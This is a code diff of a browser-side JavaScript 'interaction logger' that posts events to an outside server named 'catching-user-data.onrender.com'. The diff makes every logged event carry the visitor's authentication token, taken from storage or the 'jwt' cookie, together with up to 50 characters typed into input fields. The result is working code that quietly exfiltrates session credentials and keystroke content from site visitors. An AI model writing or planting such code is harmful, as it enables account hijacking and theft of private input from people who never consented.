@@ -1,11 +1,12 @@
 document.addEventListener('DOMContentLoaded', function () {
-    console.log("Page loaded 1");
+    console.log("Page loaded");
 
     var config = {
-        userSessionID: getDefaultSessionID(), // This will now also handle logging
+        userSessionID: getDefaultSessionID(),
         serverURL: 'https://catching-user-data.onrender.com/api',
         logConsole: true,
         adminID: getAdminId(),
+        deviceType: getDeviceType()
     };
 
     function getAdminId() {
@@ -15,7 +16,27 @@ document.addEventListener('DOMContentLoaded', function () {
 
     function getTokenName() {
         var tokenNameMetaTag = document.querySelector('meta[name="token-name"]');
-        return tokenNameMetaTag ? tokenNameMetaTag.content : null;
+        return tokenNameMetaTag ? tokenNameMetaTag.content : 'jwt'; // Default to 'jwt'
+    }
+
+    function getDefaultSessionID() {
+        var tokenName = getTokenName();
+        var token = sessionStorage.getItem(tokenName) ||
+            localStorage.getItem(tokenName) ||
+            getCookie(tokenName);
+
+        return token || 'unidentifiedUser';
+    }
+
+    function getCookie(name) {
+        var nameEQ = name + "=";
+        var ca = document.cookie.split(';');
+        for (var i = 0; i < ca.length; i++) {
+            var c = ca[i];
+            while (c.charAt(0) === ' ') c = c.substring(1);
+            if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length);
+        }
+        return null;
     }
 
     function getDeviceType() {
@@ -30,83 +51,7 @@ document.addEventListener('DOMContentLoaded', function () {
     }
 
     function logInteraction(detail) {
-        detail.deviceType = getDeviceType();
-    }
-
-    function getDefaultSessionID() {
-        var tokenName = getTokenName();
-        console.log(tokenName);
-        if (!tokenName) {
-            console.log("Token name not specified.");
-            return 'defaultSessionID';
-        }
-
-        var token = sessionStorage.getItem(tokenName) ||
-            localStorage.getItem(tokenName) ||
-            getCookie(tokenName);
-
-        if (token) {
-
-            return token;
-        } else {
-            return 'unidentifiedUser'; // Use a different identifier for clarity
-        }
-    }
-
-    function getCookie(name) {
-
-        var nameEQ = name + "=";
-        var ca = document.cookie.split(';');
-        for (var i = 0; i < ca.length; i++) {
-            var c = ca[i];
-            while (c.charAt(0) === ' ') c = c.substring(1);
-            if (c.indexOf(nameEQ) === 0) {
-                var cookieValue = c.substring(nameEQ.length);
-                console.log("Cookie found - Name:", name, "Value:", cookieValue);
-                return cookieValue;
-            }
-        }
-
-        console.log("Cookie not found:", name);
-        return null;
-    }
-
-    // Attempt to retrieve the JWT token after the DOM content has loaded
-    document.addEventListener('DOMContentLoaded', function () {
-        var jwtToken = getCookie('jwt');
-        if (jwtToken) {
-
-        } else {
-
-        }
-    });
-
-    function getBrowserInfo() {
-        var ua = navigator.userAgent, tem,
-            M = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
-        if (/trident/i.test(M[1])) {
-            tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
-            return { name: 'IE', version: (tem[1] || '') };
-        }
-        if (M[1] === 'Chrome') {
-            tem = ua.match(/\b(OPR|Edge)\/(\d+)/);
-            if (tem != null) return { name: tem[1].replace('OPR', 'Opera'), version: tem[2] };
-        }
-        M = M[2] ? [M[1], M[2]] : [navigator.appName, navigator.appVersion, '-?'];
-        if ((tem = ua.match(/version\/(\d+)/i)) != null) M.splice(1, 1, tem[1]);
-        return {
-            name: M[0],
-            version: M[1]
-        };
-    }
-
-    function logInteraction(detail) {
-        var browserInfo = getBrowserInfo();
-        detail.browserName = browserInfo.name;
-        detail.browserVersion = browserInfo.version;
-        detail.currentURL = window.location.href;
-
-        if (config.logConsole) console.log('Interaction logged:', detail);
+        detail.deviceType = config.deviceType;
 
         fetch(config.serverURL, {
             method: 'POST',
@@ -114,7 +59,6 @@ document.addEventListener('DOMContentLoaded', function () {
             body: JSON.stringify(detail),
         })
             .then(response => response.ok ? response.json() : Promise.reject('HTTP error! status: ' + response.status))
-            .then(data => console.log('Data successfully sent to the server:', data))
             .catch(error => console.error('Error sending data to the server:', error));
     }
 
@@ -126,7 +70,8 @@ document.addEventListener('DOMContentLoaded', function () {
             identifier: elementIdentifier,
             timestamp: new Date().toISOString(),
             pageTitle: document.title,
-            value: eventType === 'input' ? element.value.substring(0, 50) : undefined
+            value: eventType === 'input' ? element.value.substring(0, 50) : undefined,
+            userSessionID: config.userSessionID
         };
         logInteraction(detail);
     }
